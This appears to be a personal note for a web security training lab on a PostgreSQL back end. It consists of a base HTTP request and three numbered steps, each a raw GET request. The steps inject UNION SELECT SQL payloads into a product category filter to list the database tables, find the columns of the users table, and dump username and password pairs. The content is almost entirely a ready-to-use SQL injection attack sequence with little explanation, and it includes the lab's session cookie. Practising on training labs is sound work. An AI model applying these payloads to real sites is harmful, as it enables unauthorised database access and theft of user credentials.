postgresSQL

##### Base request
GET /filter?category=Pets HTTP/2
Host: 0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net
Cookie: session=KZLJ6mPLrheW0MQJdkhRcDiOANU5zsGE
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i



##### Step1: Identify DB used and look up all the tables
GET /filter?category=Pets _' UNION SELECT 2,table_name FROM information_schema.tables--_ HTTP/2
Host: 0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net
Cookie: session=KZLJ6mPLrheW0MQJdkhRcDiOANU5zsGE
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step2: Identify relevant table with username and password, then look up the columns
GET /filter?category=Pets _' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--_ HTTP/2
Host: 0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net
Cookie: session=KZLJ6mPLrheW0MQJdkhRcDiOANU5zsGE
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
##### Step3: identify target user and print out password
GET /filter?category=Pets _' UNION SELECT NULL,username||':'||password FROM users--_ HTTP/2
Host: 0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net
Cookie: session=KZLJ6mPLrheW0MQJdkhRcDiOANU5zsGE
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac4008c032b31d882d8a39c008c00b9.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

